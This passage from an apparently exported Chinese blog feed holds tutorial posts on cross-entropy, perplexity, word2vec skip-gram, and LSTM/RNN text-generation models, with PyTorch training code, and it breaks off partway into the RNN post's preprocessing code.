  根据似然函数，要使得其值为最大值，及 对其取负对数，此外根据我们之前的定义：我们将$\hat{y}i$当做给定特征向量$x_i$的每个类别的条件概率。因此我们得到 $-log{L(\theta)} = -log{\prod\limits{i=1}^{n} P(y_i|x_i,\theta)} = -\sum\limits_{i=1}^{n} log{P(y_i|x_i,\theta)}= -\sum\limits_{i=1}^{n} log{\hat{y_i}}$
  我们通过信息论中的定义得到交叉熵损失函数定义：$l(y,\hat{y}) = - \sum\limits_{j=1}^{q} y_j * log{\hat{y}_j}$ ，其描述的是标签$y_j$和预测值$\hat{y_j}$两个分布之间的差异值。
  我们对其交叉损失函数进行多个样本的求和可以得到：$\sum\limits_{i=1}^{n}{l(y,\hat{y})} = - \sum\limits_{i=1}{n}{\sum\limits_{j=1}{q} y_j * log{\hat{y}_j}}$
  由于$y_j$是标签的热独向量，只有对应类别概率为1，其他类别为0，因此$\sum\limits_{j=1}^{q} y_j * log{\hat{y}j} = log{\hat{y}j}$，因此可以得到交叉熵损失和似然函数之间的关系：$\sum\limits{i=1}^{n}{l(y,\hat{y})} = - \sum\limits{i=1}{n}{\sum\limits_{j=1}{q} y_j * log{\hat{y}j}} = - \sum\limits{i=1}^{n}{log{\hat{y}_j}} $
  从这里可以知道交叉熵损失函数与负对数似然函数的关系。


困惑度（Perplexity）
  这里我们讨论如何度量语言模型的质量。这里根据参考文件中的建议，不要直接使用交叉熵来理解，要从另外一个角度来理解。
  如果想要压缩文本，我们可以根据当前词元集预测的下一个词元。 一个更好的语言模型应该能让我们更准确地预测下一个词元。 因此，它应该允许我们在压缩序列时花费更少的比特。 所以我们可以通过一个序列中所有的个词元的交叉熵损失的平均值来衡量：
$\frac{1}{n}\sum\limits_{t=1}^{n} -\log P(x_t|x_{t-1}, …, x_1)$，我们看这个公式的含义就是每个预测的词元信息量求和，然后再求平均值，最后平均值越小，意味着我们整个模型蕴含的信息量越小，我们要压缩这个文本需要的比特最少。
  由于历史原因，自然语言处理的科学家更喜欢使用一个叫做困惑度（perplexity）的量。 简而言之，它是上面提到的信息量均值的指数：$\exp(\frac{1}{n}\sum\limits_{t=1}^{n} -\log P(x_t|x_{t-1}, …, x_1))$
  我们来看一下困惑度的特性（信息量取值是[0,1]）：


当最好情况下，因此当每个变量预测概率都是1，信息量为0，困惑度是$\exp^0 = 1$


当最坏情况下，因此当每个变量预测概率都是0，信息量为无穷大，困惑度是$\exp^{\infty} = \infty$






后记

  看了上面这些内容，有些是以前接触过的，有些是新的体验 总的来说，脑袋大了。
参考文献


http://zh.gluon.ai/







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(二)---词嵌入(word embedding)</title>
    <url>/2025/03/16/blog_idx_138/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  本文是这个系列第二篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》https://www.cnblogs.com/Iflyinsky/p/18717317


  本系列虽然是大模型相关内容，但是主要还是大语言模型，对于大语言模型来说，其输入是我们值得关心的。
  自然语言的基本单位是词或者字，对于模型来说，是没有办法直接输入文字的，因此我们需要一种方法将文字转换为LLM所能接受的格式，我们将词转换为向量的表达这种技术叫做词嵌入（word embedding）。
  下面我们介绍一种在后续例子中会出现的一种直观词嵌入方法：one_hot向量。




one_hot向量

  其含义非常的简单，如果有5个不同的词，那么生成5个0，1的向量即可，例如：$[1,0,0,0,0]$或者$[0,0,0,0,1]$，通过这样简单的向量，就可以标识所有的字。
  虽然其看起来简单，但是有些缺陷，例如：现在我们来考虑一个问题，我们用one_hot向量A表示‘似’，用one_hot向量B表示‘像’，然后我们求其余弦相似度 $\cos{\theta} = \frac{A^TB}{|A||B|} = 0$ ，难道现在我们可以说‘似’和‘像’是无关联的吗？
  根据上面的这个疑问，很明显要解决这个问题，需要把词映射为像人脸识别中的人脸特征向量这样的特征向量。下面我们介绍word2vec这个工具，注意词向量的表达有很多越来越好的方法，这里我们只需要了解一个基本即可。




word2vec

  word2vec工具可以将每个词映射为固定长度的向量，这些向量能够表达词的相似性关系。如果大家做过人脸识别，那就对这个相似性概念一点也不陌生。
  word2vec工具包含了两个模型：跳元模型（skip-gram），连续词袋（CBOW）。这些模型的训练依赖于条件概率，且由于是不带标签的数据，他们是自监督模型。
  下面我们只简单分析一个简单的：跳元模型（skip-gram）。


跳元模型（skip-gram）
  跳元模型假设一个词可以用来在文本序列中生成其周围的单词。我们以文本序列：“自太古以来”为例，给定中心词“古”，给定上下文窗口是2，跳元模型考虑生成上下文词“自”，“太”，“以”，“来”的条件概率是：$P(“自”，“太”，“以”，“来”|“古”) = P(“自”|“古”)*P(“太”|“古”)*P(“以”|“古”)*P(“来”|“古”)$。
  在跳元模型中，对于词表V中索引为i的的词$w_i$，其有两个向量$v_i$和$u_i$，他们分别表示为$w_i$做为中心词、上下文词时的向量。此时我们给定中心词$w_c$，生成上下文词$w_o$的条件概率可以使用u,v向量的点积和softmax来建模：$P(w_o|w_c) = \frac{exp(u_o^T v_c)}{\sum_{i\in{V}}  exp(u_i^T v_c)}$
  现在我们给定词表V，时间步t处的词表示为$w_t$，给定上下文窗口是m，跳元模型的似然函数是在给定任何中心词的情况下生成所有上下文词的概率：$\prod\limits_{t-1}^{T} \prod\limits_{-m\le j \le m, j \ne 0} P(w_{t+j}|w_{t})$
  然后我们就通过最大化似然函数来学习模型参数，相当于最小化负对数似然函数，然后得到损失函数是：$-\sum\limits_{t-1}^{T} \sum\limits_{-m\le j \le m, j \ne 0} log(P(w_{t+j}|w_{t}))$。
  最后当我们使用随机梯度下降来最小化损失时，我们选取一个短的序列来计算该序列的梯度。注意，我们的模型定义为：$P(w_o|w_c) = \frac{exp(u_o^T v_c)}{\sum_{i\in{V}}  exp(u_i^T v_c)}$，我们给定$v_c$，求$v_o$的梯度。
  为了方便计算，我们对模型取对数，可得到:$log(P(w_o|w_c)) = u_o^T v_c - log(\sum_{i\in{V}}  exp(u_i^T v_c))$
  然后我们求相对于$v_c$的微分，可以得到：$\frac{\partial}{\partial v_c}(log(P(w_o|w_c))) = \frac{\partial}{\partial v_c}(u_o^T v_c) - \frac{\partial}{\partial v_c}(log(\sum_{i\in{V}}  exp(u_i^T v_c)))  = u_o -  \frac{1}{\sum_{i\in{V}}  exp(u_i^T v_c)}  * \frac{\partial}{\partial v_c}(\sum_{i\in{V}}  exp(u_i^T v_c)) = u_o -  \frac{1}{\sum_{i\in{V}}  exp(u_i^T v_c)}  * (\sum_{j\in{V}}  exp(u_j^T v_c)*u_j) = u_o - \sum\limits_{j\in{V}}(\frac{exp(u_j^T v_c)*u_j}{\sum_{i\in{V}}  exp(u_i^T v_c)}) = u_o - \sum\limits_{j\in{V}}(\frac{exp(u_j^T v_c)}{\sum_{i\in{V}}  exp(u_i^T v_c)})*u_j = u_o - \sum\limits_{j\in{V}} P(w_j|w_c)u_j$
  注意中间关于对数的求导计算：令$f(v_c) = \sum_{i\in{V}}  exp(u_i^T v_c)$，可以通过
$\frac{\partial}{\partial v_c}(log f(v_c)) = u_o -  \frac{1}{f(v_c)}  * \frac{\partial}{\partial v_c}(f(v_c))$得到上面的结果。




Tokenizer

  注意，在这些把词生成向量的过程，我们上文已经提到了。但是这里忽略了一个大问题，就是我们默认将语句拆分了词或者字。
  因此在做向量化之前，有一个关键的动作是分词，从2025/03现在来看，分词的主要作用是将字转换（浓缩为）为token id。现在简单理解就是：tokenid可能是一个字、词或者零点几个字、词。
  以后有机会再挖这个的坑吧，现在先简单这样理解。




后记

  虽然现在有更加先进的模型代替了这些基础的模型，但是对于我们初学者来说，可以通过这样的一个简单的模型来知道词嵌入过程做了什么是非常有意义的。
  此外从上面的过程我们可以知道，我们在用大语言模型时，需要做预处理文字，非常的像使用CV模型前，对图像进行预处理。而这个预处理过程就是：分词+向量化。
参考文献


http://zh.gluon.ai/







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>WordEmbedding</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(四)---LSTM的实例与测试(RNN的改进)</title>
    <url>/2025/09/14/blog_idx_141/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

   本文是这个系列第四篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


《大模型基础补全计划(三)—RNN实例与测试》 https://www.cnblogs.com/Iflyinsky/p/18967569


   上文我们提到了RNN这种处理序列信息的网络结构，今天我们将会提到RNN的改进版本之一的网络结构：LSTM。注意在transformer结构出来之前，RNN还有很多的改进结构,毕竟这是一个大的研究方向。




LSTM (long short-term memory) 简介

  


LSTM的意义
  我们首先来想一想RNN的结构，很朴素的理解：RNN有两个输入，一个是当前输入，一个是上一次隐藏参数输入。如果我们从时间线来看，对于早期的输入$X_{t-n}$来说，由于隐藏参数一层层迭代和传递，对于$X_t$的影响非常的弱。此外，相对的，对于$X_{t-1}$来说，其对$X_t$的影响非常的强，如果$X_{t-1}$信息不完整，可能会影响输出。
  为了解决上面RNN结构遇到的问题，提出了LSTM结构。


LSTM的结构介绍
  首先我们来看看其结构图如下：

    
        
    
    
注:此图来自于 https://zh.d2l.ai/chapter_recurrent-modern/lstm.html ，若侵权，联系删之。
  其有如下的一些内容：


有三个输入：输入$X_t$，隐藏参数$H_{t-1}$，记忆$C_{t-1}$。


有三个门：输入门 $I_t = \sigma(X_tW_{xi} + H_{t-1}W_{hi} + b_i)$ ， 遗忘门 $F_t = \sigma(X_tW_{xf} + H_{t-1}W_{hf} + b_f)$，输出门 $O_t = \sigma(X_tW_{xo} + H_{t-1}W_{ho} + b_o)$


有一个候选记忆元 $\widetilde{C_t} = tanh(X_tW_{xc} + H_{t-1}W_{hc} + b_c)$。


有一个记忆元$C_t$，其含义很简单，有多少记忆来自于$\widetilde{C_t}$ ，然后由输入门 $I_t$控制多少候选记忆元进入新记忆中，由 遗忘门 遗忘门 $F_t$ 来控制多少以前的记忆$C_{t-1}$进入新的记忆中。其公式为：$C_t = F_t \odot C_{t-1} + I_t \odot \widetilde{C_t}$


有三个输出：输出门 $O_t$，记忆元 $C_t$，隐藏态$H_t = O_t \odot tanh(C_t)$


  总的来说，就是给隐藏参数加入了记忆参数，并可以通过记忆影响隐藏参数。




基于LSTM训练一个简单的文字序列输出模型

  对于文本预处理、数据集构造、训练框架搭建详见前文《大模型基础补全计划(三)—RNN实例与测试》
  下面是构建LSTM的网络结构，首先我们手动来构建网络：

def get_lstm_params(vocab_size, num_hiddens, device):
    num_inputs = num_outputs = vocab_size

    def normal(shape):
        return torch.randn(size=shape, device=device)*0.01

    def three():
        return (normal((num_inputs, num_hiddens)),
                normal((num_hiddens, num_hiddens)),
                torch.zeros(num_hiddens, device=device))

    W_xi, W_hi, b_i = three()  # 输入门参数
    W_xf, W_hf, b_f = three()  # 遗忘门参数
    W_xo, W_ho, b_o = three()  # 输出门参数
    W_xc, W_hc, b_c = three()  # 候选记忆元参数

    # 输出层参数
    W_hq = normal((num_hiddens, num_outputs))
    b_q = torch.zeros(num_outputs, device=device)

    # 附加梯度
    params = [W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc,
              b_c, W_hq, b_q]
    for param in params:
        param.requires_grad_(True)
    return params

def init_lstm_state(batch_size, num_hiddens, device):
    return (torch.zeros((batch_size, num_hiddens), device=device),
            torch.zeros((batch_size, num_hiddens), device=device))

def lstm(inputs, state, params):
    [W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc, b_c,
     W_hq, b_q] = params
    (H, C) = state
    outputs = []
    for X in inputs:
        I = torch.sigmoid((X @ W_xi) + (H @ W_hi) + b_i)
        F = torch.sigmoid((X @ W_xf) + (H @ W_hf) + b_f)
        O = torch.sigmoid((X @ W_xo) + (H @ W_ho) + b_o)
        C_tilda = torch.tanh((X @ W_xc) + (H @ W_hc) + b_c)
        C = F * C + I * C_tilda
        H = O * torch.tanh(C)
        Y = (H @ W_hq) + b_q
        outputs.append(Y)
    return torch.cat(outputs, dim=0), (H, C)
  然后是通过torch框架来设计网络：

lstm_layer = nn.LSTM(num_inputs, num_hiddens)

  最后是完整的训练代码：
import os
import random
import torch
import math
from torch import nn
from torch.nn import functional as F
import numpy as np
import time
import visdom
import sys

sys.path.append('.')
import dateset
class Accumulator:
    """在n个变量上累加"""
    def __init__(self, n):
        """Defined in :numref:`sec_softmax_scratch`"""
        self.data = [0.0] * n

    def add(self, *args):
        self.data = [a + float(b) for a, b in zip(self.data, args)]

    def reset(self):
        self.data = [0.0] * len(self.data)

    def __getitem__(self, idx):
        return self.data[idx]
    
class Timer:
    """记录多次运行时间"""
    def __init__(self):
        """Defined in :numref:`subsec_linear_model`"""
        self.times = []
        self.start()

    def start(self):
        """启动计时器"""
        self.tik = time.time()

    def stop(self):
        """停止计时器并将时间记录在列表中"""
        self.times.append(time.time() - self.tik)
        return self.times[-1]

    def avg(self):
        """返回平均时间"""
        return sum(self.times) / len(self.times)

    def sum(self):
        """返回时间总和"""
        return sum(self.times)

    def cumsum(self):
        """返回累计时间"""
        return np.array(self.times).cumsum().tolist()
    
# 以num_steps为步长，从随机的起始位置开始，返回
# x1=[ [random_offset1:random_offset1 + num_steps], ... , [random_offset_batchsize:random_offset_batchsize + num_steps] ]
# y1=[ [random_offset1 + 1:random_offset1 + num_steps + 1], ... , [random_offset_batchsize + 1:random_offset_batchsize + num_steps + 1] ]
def seq_data_iter_random(corpus, batch_size, num_steps):  #@save
    """使用随机抽样生成一个小批量子序列"""
    # 从随机偏移量开始对序列进行分区，随机范围包括num_steps-1
    corpus = corpus[random.randint(0, num_steps - 1):]
    # 减去1，是因为我们需要考虑标签
    num_subseqs = (len(corpus) - 1) // num_steps
    # 长度为num_steps的子序列的起始索引
    # [0, num_steps*1, num_steps*2, num_steps*3, ...]
    initial_indices = list(range(0, num_subseqs * num_steps, num_steps))
    # 在随机抽样的迭代过程中，
    # 来自两个相邻的、随机的、小批量中的子序列不一定在原始序列上相邻
    random.shuffle(initial_indices)

    def data(pos):
        # 返回从pos位置开始的长度为num_steps的序列
        return corpus[pos: pos + num_steps]

    num_batches = num_subseqs // batch_size
    for i in range(0, batch_size * num_batches, batch_size):
        # 在这里，initial_indices包含子序列的随机起始索引
        initial_indices_per_batch = initial_indices[i: i + batch_size]
        X = [data(j) for j in initial_indices_per_batch]
        Y = [data(j + 1) for j in initial_indices_per_batch]
        yield torch.tensor(X), torch.tensor(Y)

# 以num_steps为步长，从随机的起始位置开始，返回
# x1=[:, random_offset1:random_offset1 + num_steps]
# y1=[:, random_offset1 + 1:random_offset1 + num_steps + 1]

def seq_data_iter_sequential(corpus, batch_size, num_steps):  #@save
    """使用顺序分区生成一个小批量子序列"""
    # 从随机偏移量开始划分序列
    offset = random.randint(0, num_steps)
    num_tokens = ((len(corpus) - offset - 1) // batch_size) * batch_size
    # 重新根据corpus建立X_corpus, Y_corpus，两者之间差一位。注意X_corpus, Y_corpus的长度是batch_size的整数倍
    Xs = torch.tensor(corpus[offset: offset + num_tokens])
    Ys = torch.tensor(corpus[offset + 1: offset + 1 + num_tokens])

    # 直接根据batchsize划分X_corpus, Y_corpus
    Xs, Ys = Xs.reshape(batch_size, -1), Ys.reshape(batch_size, -1)
    # 计算出需要多少次才能取完数据
    num_batches = Xs.shape[1] // num_steps
    for i in range(0, num_steps * num_batches, num_steps):
        X = Xs[:, i: i + num_steps]
        Y = Ys[:, i: i + num_steps]
        yield X, Y


class SeqDataLoader:  #@save
    """加载序列数据的迭代器"""
    def __init__(self, batch_size, num_steps, use_random_iter, max_tokens):
        if use_random_iter:
            self.data_iter_fn = seq_data_iter_random
        else:
            self.data_iter_fn = seq_data_iter_sequential
        self.corpus, self.vocab = dateset.load_dataset(max_tokens)
        self.batch_size, self.num_steps = batch_size, num_steps

    def __iter__(self):
        return self.data_iter_fn(self.corpus, self.batch_size, self.num_steps)
    
def load_data_epoch(batch_size, num_steps,  #@save
                           use_random_iter=False, max_tokens=10000):
    """返回时光机器数据集的迭代器和词表"""
    data_iter = SeqDataLoader(
        batch_size, num_steps, use_random_iter, max_tokens)
    return data_iter, data_iter.vocab



def get_lstm_params(vocab_size, num_hiddens, device):
    num_inputs = num_outputs = vocab_size

    def normal(shape):
        return torch.randn(size=shape, device=device)*0.01

    def three():
        return (normal((num_inputs, num_hiddens)),
                normal((num_hiddens, num_hiddens)),
                torch.zeros(num_hiddens, device=device))

    W_xi, W_hi, b_i = three()  # 输入门参数
    W_xf, W_hf, b_f = three()  # 遗忘门参数
    W_xo, W_ho, b_o = three()  # 输出门参数
    W_xc, W_hc, b_c = three()  # 候选记忆元参数

    # 输出层参数
    W_hq = normal((num_hiddens, num_outputs))
    b_q = torch.zeros(num_outputs, device=device)

    # 附加梯度
    params = [W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc,
              b_c, W_hq, b_q]
    for param in params:
        param.requires_grad_(True)
    return params

def init_lstm_state(batch_size, num_hiddens, device):
    return (torch.zeros((batch_size, num_hiddens), device=device),
            torch.zeros((batch_size, num_hiddens), device=device))

def lstm(inputs, state, params):
    [W_xi, W_hi, b_i, W_xf, W_hf, b_f, W_xo, W_ho, b_o, W_xc, W_hc, b_c,
     W_hq, b_q] = params
    (H, C) = state
    outputs = []
    for X in inputs:
        I = torch.sigmoid((X @ W_xi) + (H @ W_hi) + b_i)
        F = torch.sigmoid((X @ W_xf) + (H @ W_hf) + b_f)
        O = torch.sigmoid((X @ W_xo) + (H @ W_ho) + b_o)
        C_tilda = torch.tanh((X @ W_xc) + (H @ W_hc) + b_c)
        C = F * C + I * C_tilda
        H = O * torch.tanh(C)
        Y = (H @ W_hq) + b_q
        outputs.append(Y)
    return torch.cat(outputs, dim=0), (H, C)

def try_gpu(i=0):
    """如果存在，则返回gpu(i)，否则返回cpu()

    Defined in :numref:`sec_use_gpu`"""
    if torch.cuda.device_count() >= i + 1:
        return torch.device(f'cuda:&#123;i&#125;')
    return torch.device('cpu')


#@save
class RNNModel(nn.Module):
    """循环神经网络模型"""
    def __init__(self, rnn_layer, vocab_size, device, **kwargs):
        super(RNNModel, self).__init__(**kwargs)
        self.rnn = rnn_layer
        self.vocab_size = vocab_size
        self.num_hiddens = self.rnn.hidden_size
        # 如果RNN是双向的（之后将介绍），num_directions应该是2，否则应该是1
        if not self.rnn.bidirectional:
            self.num_directions = 1
            self.linear = nn.Linear(self.num_hiddens, self.vocab_size, device=device)
        else:
            self.num_directions = 2
            self.linear = nn.Linear(self.num_hiddens * 2, self.vocab_size, device=device)

    def forward(self, inputs, state):
        X = F.one_hot(inputs.T.long(), self.vocab_size)
        X = X.to(torch.float32)
        Y, state = self.rnn(X, state)
        # 全连接层首先将Y的形状改为(时间步数*批量大小,隐藏单元数)
        # 它的输出形状是(时间步数*批量大小,词表大小)。
        output = self.linear(Y.reshape((-1, Y.shape[-1])))
        return output, state

    def begin_state(self, device, batch_size=1):
        if not isinstance(self.rnn, nn.LSTM):
            # nn.GRU以张量作为隐状态
            return  torch.zeros((self.num_directions * self.rnn.num_layers,
                                 batch_size, self.num_hiddens),
                                device=device)
        else:
            # nn.LSTM以元组作为隐状态
            return (torch.zeros((
                self.num_directions * self.rnn.num_layers,
                batch_size, self.num_hiddens), device=device),
                    torch.zeros((
                        self.num_directions * self.rnn.num_layers,
                        batch_size, self.num_hiddens), device=device))


class RNNModelScratch: #@save
    """从零开始实现的循环神经网络模型"""
    def __init__(self, vocab_size, num_hiddens, device,
                 get_params, init_state, forward_fn):
        self.vocab_size, self.num_hiddens = vocab_size, num_hiddens
        # 初始化了隐藏参数 W_xh, W_hh, b_h,  W_hq, b_q
        self.params = get_params(vocab_size, num_hiddens, device)
        self.init_state, self.forward_fn = init_state, forward_fn

    def __call__(self, X, state):
        # X的形状：(batch_size, num_steps)
        # X one_hot之后的形状：(num_steps，batch_size，词表大小)
        X = F.one_hot(X.T, self.vocab_size).type(torch.float32)
        return self.forward_fn(X, state, self.params)

    def begin_state(self, batch_size, device):
        return self.init_state(batch_size, self.num_hiddens, device)

def predict_ch8(prefix, num_preds, net, vocab, device):  #@save
    """在prefix后面生成新字符"""
    state = net.begin_state(batch_size=1, device=device)
    outputs = [vocab[prefix[0]]]
    get_input = lambda: torch.tensor([outputs[-1]], device=device).reshape((1, 1))
    for y in prefix[1:]:  # 预热期
        _, state = net(get_input(), state)
        outputs.append(vocab[y])
    for _ in range(num_preds):  # 预测num_preds步
        # y 包含从开始到现在的所有输出
        # state是当前计算出来的隐藏参数
        y, state = net(get_input(), state)
        outputs.append(int(y.argmax(dim=1).reshape(1)))
    return ''.join([vocab.idx_to_token[i] for i in outputs])

def grad_clipping(net, theta):  #@save
    """裁剪梯度"""
    if isinstance(net, nn.Module):
        params = [p for p in net.parameters() if p.requires_grad]
    else:
        params = net.params
    norm = torch.sqrt(sum(torch.sum((p.grad ** 2)) for p in params))
    if norm > theta:
        for param in params:
            param.grad[:] *= theta / norm


def train_epoch_ch8(net, train_iter, loss, updater, device, use_random_iter):
    """训练网络一个迭代周期（定义见第8章）"""
    state, timer = None, Timer()
    metric = Accumulator(2)  # 训练损失之和,词元数量
    # X的形状：(batch_size, num_steps)
    # Y的形状：(batch_size, num_steps)
    for X, Y in train_iter:
        if state is None or use_random_iter:
            # 在第一次迭代或使用随机抽样时初始化state
            state = net.begin_state(batch_size=X.shape[0], device=device)
        else:
            if isinstance(net, nn.Module) and not isinstance(state, tuple):
                # state对于nn.GRU是个张量
                state.detach_()
            else:
                # state对于nn.LSTM或对于我们从零开始实现的模型是个张量
                for s in state:
                    s.detach_()
        y = Y.T.reshape(-1)
        X, y = X.to(device), y.to(device)
        # y_hat 包含从开始到现在的所有输出
        # y_hat的形状：（batch_size * num_steps， 词表大小）
        # state是当前计算出来的隐藏参数
        y_hat, state = net(X, state)
        # 交叉熵损失函数，传入预测值和标签值，并求平均值
        l = loss(y_hat, y.long()).mean()
        if isinstance(updater, torch.optim.Optimizer):
            updater.zero_grad()
            l.backward()
            grad_clipping(net, 1)
            updater.step()
        else:
            l.backward()
            grad_clipping(net, 1)
            # 因为已经调用了mean函数
            updater(batch_size=1)
        # 这里记录交叉熵损失的值的和，以及记录对应交叉熵损失值的样本个数
        metric.add(l * y.numel(), y.numel())
    # 求交叉熵损失的平均值，再求exp，即可得到困惑度
    return math.exp(metric[0] / metric[1]), metric[1] / timer.stop()


def sgd(params, lr, batch_size):
    """小批量随机梯度下降

    Defined in :numref:`sec_linear_scratch`"""
    with torch.no_grad():
        for param in params:
            param -= lr * param.grad / batch_size
            param.grad.zero_()

#@save
def train_ch8(net, train_iter, vocab, lr, num_epochs, device,
              use_random_iter=False):
    """训练模型（定义见第8章）"""
    loss = nn.CrossEntropyLoss()
    # 新建一个连接客户端
    # 指定 env=u'test1'，默认端口为 8097，host 是 'localhost'
    vis = visdom.Visdom(env=u'test1', server="http://10.88.88.136", port=8097)
    animator = vis
    # 初始化
    if isinstance(net, nn.Module):
        updater = torch.optim.SGD(net.parameters(), lr)
    else:
        updater = lambda batch_size: sgd(net.params, lr, batch_size)
    predict = lambda prefix: predict_ch8(prefix, 30, net, vocab, device)
    # 训练和预测
    for epoch in range(num_epochs):
        ppl, speed = train_epoch_ch8(
            net, train_iter, loss, updater, device, use_random_iter)
        


        if (epoch + 1) % 10 == 0:
            # print(predict('你是？'))
            # print(epoch)
            # animator.add(epoch + 1, )

            if epoch == 9:
                # 清空图表：使用空数组来替换现有内容
                vis.line(X=np.array([0]), Y=np.array([0]), win='train_ch8', update='replace')

            vis.line(
                X=np.array([epoch + 1]),
                Y=[ppl],
                win='train_ch8',
                update='append',
                opts=&#123;
                    'title': 'train_ch8',
                    'xlabel': 'epoch',
                    'ylabel': 'ppl',
                    'linecolor': np.array([[0, 0, 255]]),  # 蓝色线条
                &#125;
            )
    print(f'困惑度 &#123;ppl:.1f&#125;, &#123;speed:.1f&#125; 词元/秒 &#123;str(device)&#125;')
    print(predict('你是'))
    print(predict('我有一剑'))

if __name__ == '__main__':
    batch_size, num_steps = 32, 35
    train_iter, vocab = load_data_epoch(batch_size, num_steps)

    vocab_size, num_hiddens, device = len(vocab), 256, try_gpu()
    num_epochs, lr = 1000, 1
    model = RNNModelScratch(len(vocab), num_hiddens, device, get_lstm_params, init_lstm_state, lstm)
    
    # num_inputs = vocab_size
    # lstm_layer = nn.LSTM(num_inputs, num_hiddens)
    # model = RNNModel(lstm_layer, len(vocab), device)
    # model = model.to(device)
    
    print(predict_ch8('你是', 30, model, vocab, device))
    train_ch8(model, train_iter, vocab, lr, num_epochs, device)
  我们分别使用手动构建的LSTM和框架构建的LSTM进行训练和测试，结果如下：

    
        
    
   

    
        
    
   

    
        
    
   

    
        
    
   
  我们可以看到，模型未训练和训练后的对比，明显训练后的语句要通顺一点。




后记

  综合RNN和LSTM两篇文章的结论来看，其对序列数据确实有一定的效果。
  此外，当前我们用RNN/LSTM做了序列数据的后续模拟生成工作，但是由于网络深度、广度的问题，其效果也就比在词表中随机抽取字组成的序列看起来要好点。
参考文献


https://zh.d2l.ai/chapter_recurrent-modern/lstm.html


https://zh.d2l.ai/chapter_recurrent-neural-networks/rnn.html


https://zh.d2l.ai/chapter_recurrent-neural-networks/text-preprocessing.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>RNN</tag>
        <tag>LSTM</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(三)---RNN实例与测试</title>
    <url>/2025/07/05/blog_idx_139/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

   本文是这个系列第三篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


   在CV世界里，卷积神经网络一直是主流。在以前，NLP的世界里，循环神经网络是主流，站在今天大模型时代，Transformer 及相关变体，是当今的NLP的绝对主流。但是我们要了解Transformer提出的原因，还需要回到循环神经网络，了解其历史变迁。当然，在循环神经网络中，一些主流的概念当前也还在使用，例如：token、词表等等。
  因此，如本文题目所示，本文主要简单介绍一下RNN，并尝试用RNN训练一个简单的文本续写模型。




RNN （Recurrent Neural Network）

  


RNN的意义
  在提到rnn之前，我们还是有必要先提一下cnn，cnn的应用目标是指定一个输入，获得一个模型输出，多次输入之间是没有必然联系。然而，在日常生活中，我们还有许多其他的任务是多个输入之间是有前后关系的。例如：机翻、对话模型等等，这些任务都有明显的特征，那就是输入数据是一个序列，前面输入的数据会对后面的输出产生了影响，因此有了rnn模型结构。


RNN的结构
  如图（注意，此图找不到来源出处，看到网络大部分文章都引用了此图，若有侵权，联系删除）rnn的基础结构就三层：输入层、隐藏层、输出层，：

    
        
    
   
  从图中可以知道，W是一个隐藏参数，是作为来至于上一次模型计算值$S_{t-1}$的参数。V是输出的参数，U是输入的参数。那么我们就可以简单定义模型结构是：$S_t = UX_t + WS_{t-1} + b_i$和  $O_t = V*S_t + b_o$
  对于输入层来说，其是一个输入序列，我们输出的内容也是一个序列。
  注意，这里的核心就是$S_t$，前面的输入$X_t$对应一个$S_t$，那么在计算$O_{t+1}$的时候，会用到$S_t$。这样对于这个模型来说，$X_t$对$O_{t+1}$是有影响的，也就意味着，模型可能可以学习到$X_t$和$X_{t+1}$的关系。




基于RNN训练一个简单的文字序列输出模型

  


文本预处理
import collections
# [
#     [line0],
#     [line1],
#     .....
# ]
def read_data_from_txt():
    with open('诛仙 (萧鼎).txt', 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    return [line.strip() for line in lines]

# 下面的tokenize函数将文本行列表（lines）作为输入， 列表中的每个元素是一个文本序列（如一条文本行）。 
# 每个文本序列又被拆分成一个词元列表，词元（token）是文本的基本单位。 最后，返回一个由词元列表组成的列表，
# 其中的每个词元都是一个字符串（string）。
# [
